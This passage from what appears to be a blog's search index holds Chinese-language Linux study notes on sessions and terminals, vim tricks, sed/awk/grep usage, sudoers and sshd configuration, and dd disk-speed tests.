</ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#2-\u4f1a\u8bddsession","title":"2. \u4f1a\u8bdd\uff08Session\uff09\uff1a","text":"<p>\u4f5c\u7528\uff1a</p> <ul> <li>\u4f1a\u8bdd\u662f\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdb\u7a0b\u7ec4\u7684\u96c6\u5408\u3002\u4e00\u4e2a\u4f1a\u8bdd\u7531\u4e00\u4e2a\u4f1a\u8bdd\u9996\u9886\uff08session leader\uff09\u8fdb\u7a0b\u6765\u521b\u5efa\u3002</li> <li>\u4f1a\u8bdd\u7684\u521b\u5efa\u548c\u7ec8\u6b62\u53ef\u4ee5\u5f71\u54cd\u5230\u5176\u4e2d\u7684\u6240\u6709\u8fdb\u7a0b\u7ec4\u3002</li> </ul> <p>\u5e94\u7528\u573a\u666f\uff1a</p> <ul> <li>\u5f53\u7528\u6237\u767b\u5f55\u5230\u7cfb\u7edf\u65f6\uff0c\u901a\u5e38\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\uff0c\u8be5\u4f1a\u8bdd\u5305\u542b\u4e0e\u7528\u6237\u4ea4\u4e92\u7684\u6240\u6709\u8fdb\u7a0b\u7ec4\u3002</li> <li>\u4f1a\u8bdd\u7684\u521b\u5efa\u548c\u7ec8\u6b62\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u7528\u6237\u767b\u5f55\u548c\u6ce8\u9500\u7684\u7ba1\u7406\u3002</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#3-\u63a7\u5236\u7ec8\u7aefcontrolling-terminal","title":"3. \u63a7\u5236\u7ec8\u7aef\uff08Controlling Terminal\uff09\uff1a","text":"<p>\u4f5c\u7528\uff1a</p> <ul> <li>\u63a7\u5236\u7ec8\u7aef\u662f\u4e0e\u4e00\u4e2a\u4f1a\u8bdd\u5173\u8054\u7684\u7ec8\u7aef\u8bbe\u5907\uff0c\u5b83\u63a5\u6536\u7528\u6237\u8f93\u5165\u5e76\u663e\u793a\u8f93\u51fa\u3002</li> <li>\u63a7\u5236\u7ec8\u7aef\u7684\u5b58\u5728\u5141\u8bb8\u7528\u6237\u4e0e\u524d\u53f0\u8fdb\u7a0b\u7ec4\u8fdb\u884c\u4ea4\u4e92\u3002</li> </ul> <p>\u5e94\u7528\u573a\u666f\uff1a</p> <ul> <li>\u5f53\u7528\u6237\u5728\u7ec8\u7aef\u4e0a\u8f93\u5165\u547d\u4ee4\u65f6\uff0c\u8f93\u5165\u5c06\u53d1\u9001\u5230\u4e0e\u5f53\u524d\u4f1a\u8bdd\u5173\u8054\u7684\u63a7\u5236\u7ec8\u7aef\uff0c\u524d\u53f0\u8fdb\u7a0b\u7ec4\u4f1a\u63a5\u6536\u8f93\u5165\u5e76\u4ea7\u751f\u8f93\u51fa\u3002</li> <li>\u63a7\u5236\u7ec8\u7aef\u7684\u6982\u5ff5\u7528\u4e8e\u7ba1\u7406\u4e0e\u7528\u6237\u4ea4\u4e92\u7684\u8fdb\u7a0b\uff0c\u4ee5\u53ca\u5c06\u8f93\u5165\u8f93\u51fa\u4ece\u7528\u6237\u7ec8\u7aef\u4f20\u9012\u5230\u76f8\u5e94\u7684\u8fdb\u7a0b\u3002</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u793a\u4f8b\u573a\u666f","title":"\u793a\u4f8b\u573a\u666f\uff1a","text":"<p>\u5047\u8bbe\u4f60\u5728\u4f7f\u7528\u4e00\u4e2a\u7ec8\u7aef\u7a97\u53e3\u767b\u5f55\u5230\u7cfb\u7edf\uff0c\u4f60\u542f\u52a8\u4e86\u4e00\u4e2a\u6587\u4ef6\u590d\u5236\u4efb\u52a1\uff08\u8fdb\u7a0b\u7ec41\uff09\u548c\u4e00\u4e2a\u6587\u4ef6\u641c\u7d22\u4efb\u52a1\uff08\u8fdb\u7a0b\u7ec42\uff09\u3002\u8fd9\u4e24\u4e2a\u8fdb\u7a0b\u7ec4\u90fd\u5c5e\u4e8e\u540c\u4e00\u4e2a\u4f1a\u8bdd\uff0c\u5e76\u4e14\u4e0e\u4f60\u7684\u63a7\u5236\u7ec8\u7aef\u5173\u8054\u3002\u8fd9\u6837\uff0c\u4f60\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e2d\u5b9e\u65f6\u67e5\u770b\u590d\u5236\u8fdb\u5ea6\u5e76\u4e0e\u6587\u4ef6\u641c\u7d22\u4efb\u52a1\u8fdb\u884c\u4ea4\u4e92\u3002\u5982\u679c\u4f60\u6ce8\u9500\u767b\u5f55\uff0c\u6574\u4e2a\u4f1a\u8bdd\uff08\u5305\u62ec\u4e24\u4e2a\u8fdb\u7a0b\u7ec4\u548c\u63a7\u5236\u7ec8\u7aef\uff09\u90fd\u4f1a\u88ab\u7ec8\u6b62\u3002</p> <p>\u8fd9\u4e9b\u6982\u5ff5\u7684\u5408\u7406\u4f7f\u7528\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u7ec4\u7ec7\u548c\u7ba1\u7406\u8fdb\u7a0b\uff0c\u4ee5\u53ca\u5b9e\u73b0\u7528\u6237\u53cb\u597d\u7684\u7ec8\u7aef\u4ea4\u4e92\u3002</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u9000\u51fa\u7ec8\u7aef\u540e\u547d\u4ee4\u4e0d\u9000\u51fa","title":"\u9000\u51fa\u7ec8\u7aef\u540e\u547d\u4ee4\u4e0d\u9000\u51fa","text":"<ul> <li>nohup command</li> <li>setsid command<ul> <li>\u5c06command\u653e\u5728\u65b0\u7684session\u4e2d\u6267\u884c</li> </ul> </li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#linux\u547d\u4ee4option\u901a\u7528\u683c\u5f0f","title":"linux\u547d\u4ee4option\u901a\u7528\u683c\u5f0f","text":"<ul> <li>POSIX-styled\u7684option\u7531\u4e00\u4e2adash\u548c\u4e00\u4e2a\u5b57\u7b26\u7ec4\u6210</li> <li>GNU-style\u7684long option\u7531\u4e24\u4e2adash\u548c\u4e00\u4e2a\u5173\u952e\u5b57(keyword)\u7ec4\u6210</li> <li>\u5173\u952e\u5b57\u80fd\u88ab\u7f29\u5199\uff0c\u53ea\u8981\u8db3\u591f\u533a\u5206\u4e0d\u540c\u5173\u952e\u5b57</li> <li>\u5982\u679c\u5173\u952e\u5b57\u9700\u8981\u4e00\u4e2a\u53c2\u6570(argument)\uff0c\u53ef\u4ee5\u5728\u5173\u952e\u5b57\u540e\u7d27\u8ddf\u4e00\u4e2a\u7b49\u53f7=\uff0c\u7136\u540e\u7d27\u8ddf\u7740\u5173\u952e\u5b57\u7684\u503c\u3002\u6216\u8005\u5c06\u5173\u952e\u5b57\u548c\u503c\u7528\u7a7a\u767d\u5b57\u7b26(whitespace)\u5206\u9694\u5f00\u3002</li> <li>\u5982\u679c\u5173\u952e\u5b57\u88ab\u591a\u6b21\u8d4b\u503c\uff0c\u5219\u4ee5\u6700\u540e\u4e00\u6b21\u7684\u4e3a\u51c6</li> </ul> <p>man wget - \u89e3\u6790\u65b9\u6cd5   - GUN getopt - \u662f\u5426\u652f\u6301\u5408\u5e76 - \u662f\u5426\u652f\u6301\u9009\u9879\u653e\u5728\u53c2\u6570\u540e\u9762 - <code>--</code>\u8868\u793aoption\u7ed3\u675f\u3002Since the options can be specified after the arguments, you may terminate them with <code>--</code>.  So the following will try to download URL -x, reporting failure to log: <code>wget -o log -- -x</code></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#vim","title":"vim","text":"<p>Vim Cheat Sheet (rtorr.com)</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u57fa\u672c","title":"\u57fa\u672c","text":"<pre><code># insert mode\ni, o, O\n\n# \u5149\u6807\u79fb\u52a8\ni, j, k, l\ngg, G\nw, W, b, B # move word\n\n# \u590d\u5236\u7c98\u8d34\nyy, p\ndw # \u526a\u5207\u5355\u8bcd\n\n/pattern   # \u67e5\u627e\nn\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u6dfb\u52a0tab","title":"\u6dfb\u52a0tab","text":"<ul> <li>ctrl-v\u8fdb\u5165visual block\u6a21\u5f0f\uff08\u5982\u679c\u4f7f\u7528windows terminal\uff0cctrl-v\u88ab\u8bbe\u7f6e\u4e3a\u7c98\u8d34\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u8fdb\u5165\uff09\uff0c\u6216\u8005shift-v\u8fdb\u5165visual line\u6a21\u5f0f\u3002</li> <li>\"shift + dot\"\uff0c\u88ab\u9009\u4e2d\u7684\u884c\u4fbf\u4f1atab\u4e00\u6b21\uff0c\u91cd\u590d\"dot\"\u53ef\u4ee5tab\u4efb\u610f\u6b21<ul> <li>\u6216\u8005<code>:</code>\u8fdb\u5165\u547d\u4ee4\u6a21\u5f0f\uff0c<code>&gt;</code>\u5f80\u53f3tab\uff0c<code>&lt;</code>\u5f80\u5de6tab</li> </ul> </li> </ul> <p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u547d\u4ee4\u6a21\u5f0f\uff0c\u4ee5\u4e0b\u547d\u4ee4\u5c061-5\u884c\u5411\u53f3tab 2\u6b21 <pre><code>:1,5&gt;&gt;\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u9ad8\u7ea7","title":"\u9ad8\u7ea7","text":"<p>\u5149\u6807\u79fb\u52a8 <pre><code>H, M, L # \u00a0top, middle, bottom of screen\n\nfx # jump to next occurrence of character x\n} # jump to next paragraph (or function/block, when editing code)\n{\n\nzz # center cursor on screen\n\nCtrl\u00a0+\u00a0b\u00a0- move back one full screen\nCtrl\u00a0+\u00a0f\u00a0- move forward one full screen\nCtrl\u00a0+\u00a0d\u00a0- move forward 1/2 a screen\nCtrl\u00a0+\u00a0u\u00a0- move back 1/2 a screen\n</code></pre></p> <p>\u67e5\u627e\u66ff\u6362 - %\u8868\u793a\u6574\u4e2a\u6587\u4ef6range\uff08\u5426\u5219\u53ea\u4f1a\u66ff\u6362\u7b2c\u4e00\u6b21\u5339\u914d\uff09 <pre><code>:%s/xxx/yyy/g\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u6267\u884cshell\u547d\u4ee4","title":"\u6267\u884cshell\u547d\u4ee4","text":"<pre><code>:!{cmd}\n\n:!ls -alh # \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u6587\u4ef6\n\n:w !{cmd}   # buffer | cmd\n\n:%!{cmd}   # buffer | cmd | buffer\n:%!grep xxx  # \u8fc7\u6ee4\u6587\u4ef6\u5185\u5bb9\uff0c\u4fdd\u7559\u5339\u914d\u7684\u90e8\u5206\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5fd8\u8bb0sudo","title":"\u5fd8\u8bb0sudo","text":"<p>write with sudoHow does the vim \"write with sudo\" trick work? - Stack Overflow</p> <p><pre><code>:w !sudo tee %\n</code></pre> - w\u547d\u4ee4\u5b8c\u6574\u683c\u5f0f\uff1a<code>:[range]w[rite] [++opt] !{cmd}</code>   - \u8868\u793a\u6267\u884ccmd\uff0c\u5e76\u5c06\u5f53\u524d\u7f16\u8f91\u7f13\u51b2\u533a\u5185\u5bb9\u4f5c\u4e3acmd\u8f93\u5165   - \u4f8b\u5b50<code>:w !grep xxx</code>\uff0cgrep\u6587\u4ef6\u5185\u5bb9 - <code>%</code>\uff1a\u8fd9\u91cc\u8868\u793a\u6587\u4ef6\u540d - \u56e0\u6b64\u4e0a\u8ff0\u547d\u4ee4\u5c06buffer\u5185\u5bb9pipe\u7ed9sudo\u6267\u884c\u7684tee\u547d\u4ee4\uff0ctee\u547d\u4ee4\u5c06stdin\u8f93\u51fa\u5230\u5f53\u524d\u6587\u4ef6\u548cstdout\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u6587\u4ef6\u7684\u5199\u5165\u3002</p> <p>\u4e3a\u4e0a\u8ff0\u547d\u4ee4\u8bbe\u7f6e\u522b\u540dw!! <pre><code>\" Allow saving of files as sudo when I forgot to start vim using sudo.\ncmap w!! w !sudo tee &gt; /dev/null %\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7f16\u8f91\u4e8c\u8fdb\u5236\u6587\u4ef6","title":"\u7f16\u8f91\u4e8c\u8fdb\u5236\u6587\u4ef6","text":"<p>binary file - How can I use Vim as a hex editor? - Vi and Vim Stack Exchange</p> <p><code>:%!xxd</code> - <code>:%!{cmd}</code>\u6709\u70b9\u50cfloopback\uff0c\u628a\u5f53\u524d\u7f13\u51b2\u533apipe\u7ed9cmd\u7136\u540e\u518d\u5c06\u5176\u8f93\u51fa\u5199\u56de\u5230\u7f13\u51b2\u533a\u3002 - xxd\u8f93\u5165\u4e8c\u8fdb\u5236\u8f93\u51fahex\u6587\u672c</p> <p><code>:%!xxd -r</code> - xxd -r\u8f93\u5165hex\u6587\u672c\u8f93\u51fa\u4e8c\u8fdb\u5236</p> <p><code>:wq</code> \u5199\u56de\u6587\u4ef6</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>map &lt;C-c&gt; \"+y&lt;CR&gt;\nmap &lt;C-v&gt; \"+p&lt;CR&gt;\n\ncommand! Vb normal! &lt;C-v&gt;\n\ncmap w!! w !sudo tee &gt; /dev/null %\n</code></pre> <p>\u81ea\u5b9a\u4e49\u547d\u4ee4\uff1akey bindings - Is there a command to enter Visual Block mode? - Vi and Vim Stack Exchange</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#cp\u6ce8\u610f\u70b9","title":"cp\u6ce8\u610f\u70b9","text":"<ul> <li>cp file1 file2 ... dir</li> <li>cp -r dir1 dir2<ul> <li>\u5982\u679cdir2\u5b58\u5728\uff0c\u5219\u5c06dir1\u590d\u5236\u5230dir2\u5185\uff0c\u5373dir2/dir1</li> <li>\u5982\u679cdir2\u4e0d\u5b58\u5728\uff0c\u5219\u5c06dir1\u590d\u5236\u4e3adir2</li> </ul> </li> <li>cp dir1/* dir2</li> <li>\u5c06dir1\u4e0b\u6240\u6709\u6587\u4ef6\u590d\u5236\u5230dir2\u5185\uff0c\u5982\u679cdir1\u5b58\u5728\u76ee\u5f55\uff0c\u5219\u5e94\u6dfb\u52a0-r\u9009\u9879</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#sed-awk-grep","title":"sed, awk, grep","text":"<p>\u8fd9\u4e9b\u547d\u4ee4\u8981\u6df1\u5165\u7814\u7a76\u7684\u8bdd\uff0c\u5185\u5bb9\u90fd\u5f88\u591a\u3002\u6bd4\u5982awk\u53ef\u4ee5\u7b97\u662f\u4e00\u79cd\u7528\u4e8e\u5904\u7406\u6587\u672c\u7684\u89e3\u91ca\u578b\u7f16\u7a0b\u8bed\u8a00\u3002\u56e0\u6b64\uff0c\u6bd4\u8f83\u597d\u7684\u65b9\u6cd5\u662f\u4ece\u9700\u6c42\u51fa\u53d1\uff0c\u770b\u770b\u5728linux\u4e0b\u4e00\u822c\u6709\u54ea\u4e9b\u6587\u5b57\u5904\u7406\u7684\u9700\u6c42\uff0c\u518d\u770b\u4f7f\u7528\u54ea\u79cd\u5de5\u5177\u6bd4\u8f83\u65b9\u4fbf\u7b80\u5355\u3002</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u547d\u4ee4\u683c\u5f0f","title":"\u547d\u4ee4\u683c\u5f0f","text":"<pre><code>grep [option] pattern file\n\nsed [options] 'command' file(s)\nsed [options] -f scriptfile file(s)\n\nawk [options] 'pattern {action}' [file]\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u6b63\u5219\u8868\u8fbe\u5f0f","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u57fa\u672c\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Basic Regular Expressions\uff09\u548c\u6269\u5c55\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Extended Regular Expressions\uff09\u662f\u4e24\u79cd POSIX \u6b63\u5219\u8868\u8fbe\u5f0f\u98ce\u683c\u3002</p> <p>BRE \u53ef\u80fd\u662f\u5982\u4eca\u6700\u8001\u7684\u6b63\u5219\u98ce\u683c\u4e86\uff0c\u5bf9\u4e8e\u90e8\u5206\u7279\u6b8a\u5b57\u7b26\uff08\u5982 <code>+</code>, <code>?</code>, <code>|</code>, <code>{</code>\uff09\u9700\u8981\u52a0\u4e0a\u8f6c\u4e49\u7b26 <code>\\</code> \u624d\u80fd\u8868\u8fbe\u5176\u7279\u6b8a\u542b\u4e49\u3002</p> <p>ERE \u4e0e\u5982\u4eca\u7684\u73b0\u4ee3\u6b63\u5219\u98ce\u683c\u8f83\u4e3a\u4e00\u81f4\uff0c\u76f8\u6bd4 BRE\uff0c\u4e0a\u8ff0\u7279\u6b8a\u5b57\u7b26\u9ed8\u8ba4\u53d1\u6325\u7279\u6b8a\u4f5c\u7528\uff0c\u52a0\u4e0a <code>\\</code> \u4e4b\u540e\u8868\u8fbe\u666e\u901a\u542b\u4e49\u3002</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5e38\u89c1\u9700\u6c42","title":"\u5e38\u89c1\u9700\u6c42","text":"<ul> <li>\u4fee\u6539\u6587\u4ef6\u4e2d\u67d0\u90e8\u5206\u5185\u5bb9\u3002\u4e00\u822c\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5339\u914d\u5230\u5bf9\u5e94\u4f4d\u7f6e\uff0c\u7136\u540e\u8fdb\u884c\u4fee\u6539\u3002</li> </ul> <pre><code>//\u5c06\u6587\u4ef6\u4e2d\u6240\u6709\u7684key=xxx\uff0c\u4fee\u6539\u4e3akey=${val}\n//-i\u8868\u793a\u5728\u539f\u6587\u4ef6\u4e0a\u4fee\u6539\uff0c\u53bb\u6389\u540e\u4f1a\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u547d\u4ee4\u884c\n// \u8fd9\u91cc\u8fd8\u7528\u5230\u4e86\u5b57\u7b26\u4e32\u62fc\u63a5\u8bed\u6cd5\uff0c\u5c06\u8fde\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u4e00\u8d77\u5c31\u4f1a\u62fc\u63a5\u3002\u5355\u5f15\u53f7\u5185\u4e0d\u80fd\u8fdb\u884c\u8f6c\u4e49\uff0c\u56e0\u6b64\u4e3a\u4e86\u4f7f\u7528\u53d8\u91cfval\u9700\u8981\u4f7f\u7528\u53cc\u5f15\u53f7\u3002\nsed -i 's/key=[0-9]+/'\"key=${val}/g\"\n</code></pre> <p>sed\u5176\u5b83\u547d\u4ee4:   - s \u66ff\u6362   - d \u5220\u9664   - c \u9009\u5b9a\u884c\u6539\u6210\u65b0\u6587\u672c   - a \u5f53\u524d\u884c\u4e0b\u63d2\u5165\u6587\u672c   - i \u5f53\u524d\u884c\u4e0a\u63d2\u5165\u6587\u672c   <pre><code>//\u627e\u5230\u67d0\u4e00\u884c\uff0c\u7136\u540e\u6574\u884c\u66ff\u6362\nsed -i \"/config_pio_local_num_iotasks/ c\\config_pio_local_num_iotasks = 3\"\n</code></pre></p> <p>\u591a\u884c\u547d\u4ee4 <pre><code>sed -i -e '/^port/c #port: 7890' -e '/^socks-port/c #socks-port: 7891' -e 's/^allow-lan.*/allow-lan: true/' -e '/^allow-lan/i mixed-port: 11223' glados.yaml\n</code></pre></p> <p>awk <pre><code>awk -F'TXT' '{print $NF}' |xargs  # TXT\u4e3a\u5206\u9694\u7b26\uff0c$NF\u4e3a\u6700\u540e\u4e00\u5217\uff0cxargs\u53bb\u9664\u7a7a\u683c(strip\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#head-tail","title":"head, tail","text":"<pre><code>tail         # \u8f93\u51fa\u6700\u540e10\u884c\ntail -n k    # \u8f93\u51fa\u6700\u540ek\u884c\ntail -n +k   # \u8f93\u51fa\u4ece\u7b2ck\u884c\uff081\u5f00\u59cb\uff09\u7684\u6240\u6709\u884c\n\nhead         # \u8f93\u51fa\u524d10\u884c\nhead -n k    # \u8f93\u51fa\u524dk\u884c\nhead -n -k   # \u8f93\u51fa\u9664\u7ed3\u5c3ek\u884c\u540e\u7684\u6240\u6709\u884c\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#xargs","title":"xargs","text":"<pre><code>xargs [options] [command [initial-arguments]]\n</code></pre> <p>\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6items\uff08\u4f7f\u7528blank\u6216\u8005newline\u5206\u9694\uff09\uff0c\u7136\u540e\u6267\u884ccommand\uff08\u9ed8\u8ba4/bin/echo\uff09\u3002\u4f7f\u7528-n\u51b3\u5b9a\u6bcf\u6b21\u4f20\u9012\u591a\u5c11iterm <pre><code>\u279c  ~ echo 1 2 3 4 5 6 7 8 9 | xargs -n 3\n1 2 3\n4 5 6\n7 8 9\n</code></pre></p> <pre><code>-n max-args, --max-args=max-args\n              Use at most max-args arguments per command line.  Fewer than max-args arguments will be used if the size (see the -s option) is exceeded, unless the -x option is given, in which case xargs will exit.\n\n-r, --no-run-if-empty\n    If the standard input does not contain any nonblanks, do not run the command.  Normally, the command is run once even if there is no input.  This option is a GNU extension.\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#tar","title":"tar","text":"<p>archive - How do I tar a directory of files and folders without including the directory itself? - Stack Overflow</p> <p><pre><code>tar czf xxx.tar.gz -C &lt;dir&gt; .\n</code></pre> - -C : change the current directory - <code>.</code>: add the entire current directory</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#cut","title":"cut","text":"<pre><code>for IPV6_SUBNET in $NET_IPV6_SUBNETS; do\nSRC=$(echo $IPV6_SUBNET | cut -d \"/\" -f 1)\"/128\"\n...\ndone\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u57fa\u672c\u64cd\u4f5c","title":"\u57fa\u672c\u64cd\u4f5c","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#sudoer\u8bbe\u7f6e","title":"sudoer\u8bbe\u7f6e","text":"<pre><code>vim /etc/sudoers\n</code></pre> <p>\u5c06\u7528\u6237\u6dfb\u52a0\u5230admin\u6216sudo\u7528\u6237\u7ec4\u5373\u53ef</p> <p>\u514d\u5bc6\u7801\uff1a <pre><code>%sudo   ALL=(ALL:ALL) NOPASSWD: ALL\n</code></pre></p> <p>sudoers\u6bcf\u9879\u542b\u4e49\uff08\u5f85\u7eed\uff09</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#linux-sshd\u8bbe\u7f6e","title":"linux sshd\u8bbe\u7f6e","text":"<p>\u5141\u8bb8ssh\u767b\u5f55root</p> <p>\u5148\u6539\u4e3ayes\uff0c\u7136\u540essh-copy-id\u540e\uff0c\u6539\u4e3a\u7981\u7528\u5bc6\u7801 <pre><code>PermitRootLogin prohibit-password\n#PermitRootLogin yes\n</code></pre></p> <p>\u7981\u7528\u5bc6\u7801\u767b\u5f55</p> <pre><code>PasswordAuthentication no\n</code></pre> <p>\u5176\u5b83\u9009\u9879 <pre><code>PermitRootLogin prohibit-password\nPubkeyAuthentication yes    # \u5141\u8bb8\u516c\u94a5\u767b\u5f55\nPubkeyAcceptedKeyTypes=+ssh-rsa\nPasswordAuthentication no   # \u7981\u7528\u5bc6\u7801\u767b\u5f55\nChallengeResponseAuthentication no\n</code></pre></p> <pre><code>Accepted password for yfy from 192.168.36.215 port 50342 ssh2\n\nAccepted publickey for yfy from 192.168.36.180 port 26464 ssh2: RSA SHA256:z9yheNzateaIikTVkTXN1lmMPRIsp+H0ssbhU4Q8Kfg\npam_unix(sshd:session): session opened for user yfy(uid=1000) by (uid=0)\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#move-running-process-to-tmux","title":"move running process to tmux","text":"<p>Move a running process into a tmux session | ./xai.sh</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u6d4b\u8bd5\u78c1\u76d8\u901f\u5ea6","title":"\u6d4b\u8bd5\u78c1\u76d8\u901f\u5ea6","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#dd","title":"dd","text":"<p>\u4f7f\u7528dd\u7b80\u5355\u6d4b\u8bd5\u901f\u5ea6\u3002\u53ef\u4ee5\u533a\u5206usb 2.0\u548c3.0\uff1b\u53ef\u4ee5\u89c1\u8bc6PCIe 4.0 ssd\u7684\u901f\u5ea6\u3002</p> <p>\u6ce8\u610f\u9700\u8981\u5f00\u542fdirect\uff0c\u5426\u5219\u9700\u8981\u4eceuserspace\u590d\u5236\u5230kernel buffer\uff0c\u4e25\u91cd\u5f71\u54cd\u901f\u5ea6\u3002block size\u5bf9\u901f\u5ea6\u5f71\u54cd\u5f88\u5927\u3002 Why is dd with the 'direct' (O_DIRECT) flag so dramatically faster?</p> <pre><code>\u279c  speed_disk sudo dd if=/dev/zero of=/mnt/VM-Pool/ssd.test.file bs=4k count=300000 oflag=direct\n300000+0 records in\n300000+0 records out\n1228800000 bytes (1.2 GB, 1.1 GiB) copied, 3.18978 s, 385 MB/s\n\n\u279c  speed_disk sudo dd if=/dev/zero of=/mnt/VM-Pool/ssd.test.file bs=4M count=2000 oflag=direct\n2000+0 records in\n2000+0 records out\n8388608000 bytes (8.4 GB, 7.8 GiB) copied, 1.94441 s, 4.3 GB/s\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#fio","title":"fio","text":"<ul> <li>I/O type</li> <li>direct, buffered, atomic. : O_DIRECT, 